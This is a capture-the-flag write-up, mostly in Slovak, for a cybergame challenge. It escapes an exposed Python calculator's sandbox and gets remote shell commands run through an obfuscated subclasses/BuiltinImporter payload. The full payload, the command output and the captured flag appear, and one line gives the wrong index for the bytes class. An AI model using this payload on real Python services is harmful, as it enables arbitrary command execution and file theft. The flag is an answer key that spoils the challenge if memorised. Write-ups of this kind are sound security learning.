# Zadanie

EN: You have found an exposed calculator program. It doesn’t seem to do anything useful beyond simple arithmetic operations. The source code is also available on GitHub. Can you make this application more useful? Python version is 3.12.3

Service: exp.cybergame.sk:7002

SK: Našli ste verejne prístupný kalkulačný program. Zdá sa, že nevykonáva nič užitočné okrem jednoduchých aritmetických operácií. Zdrojový kód je tiež dostupný na GitHub-e. Môžete spraviť túto aplikáciu užitočnejšou? Python verzia je 3.12.3

Služba: exp.cybergame.sk:7002

**Súbory:**

- calc.py

## Riešenie

Podľa zdrojového kódu je jasné, že sa jedná o rovnakú, resp. veľmi podobnú úlohu ako [TheCatch2024_WriteUps/2_Miscellaneous/Miscellaneous_5_Snake_game at main · djmajino/TheCatch2024_WriteUps · GitHub](https://github.com/djmajino/TheCatch2024_WriteUps/tree/main/2_Miscellaneous/Miscellaneous_5_Snake_game)

Zadáme teda pre získanie podtriet toto

```
(1).__class__.__base__.__subclasses__()
```

V inom ctf som použil príkaz os.open, ale tu by som rád zadal ľubovoľný shell príkaz, napríklad `ls -la` a pod. Budeme potrebovať 

```
<class 'bytes'> na indexe 5
<class '_frozen_importlib.BuiltinImporter'> na indexe 120
```

aby sme obfuskovane zavolali niečo takéto

```python
import os
system('ls -la')
```

zadáme teda

```python
().__class__.__base__.__subclasses__()[120]().load_module(().__class__.__base__.__subclasses__()[5]([111,115]).decode()).__dict__[().__class__.__base__.__subclasses__()[5]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[5]([108,115,32,45,108,97]).decode())
```

kde 

`__subclasses__()[120]` je `<class '_frozen_importlib.BuiltinImporter'>` a

`__subclasses__()[120]` je `<class 'bytes'>` a 

`([111,115]).decode()` je string `os`

`([115,121,115,116,101,109]).decode()` je string `system` a 

`([108,115,32,45,108,97]).decode()` je string `ls -la`

dostaneme výsledok

```
nc exp.cybergame.sk 7002
>> ().__class__.__base__.__subclasses__()[120]().load_module(().__class__.__base__.__subclasses__()[5]([111,115]).decode()).__dict__[().__class__.__base__.__subclasses__()[5]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[5]([108,115,32,45,108,97]).decode())
total 32
drwxr-xr-x 1 calc calc 4096 Mar 31 20:22 .
drwxr-xr-x 1 root root 4096 Mar 31 20:01 ..
-rw-r--r-- 1 calc calc  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 calc calc 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 calc calc  807 Apr 23  2023 .profile
-rw-rw-r-- 1 root root   38 Mar 31 16:53 flag.txt
-rw-rw-r-- 1 root root 1762 Mar 31 20:22 main.py
```

vlajku mam v aktuálnom pwd, takže modifikuje predošlý príkaz na `cat flag.txt`

```
nc exp.cybergame.sk 7002
>> ().__class__.__base__.__subclasses__()[120]().load_module(().__class__.__base__.__subclasses__()[5]([111,115]).decode()).__dict__[().__class__.__base__.__subclasses__()[5]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[5]([99,97,116,32,102,108,97,103,46,116,120,116]).decode())
SK-CERT{35c3p1ng_py7h0n_15_345y_745k}
```

## Vlajka

```
SK-CERT{35c3p1ng_py7h0n_15_345y_745k}
```
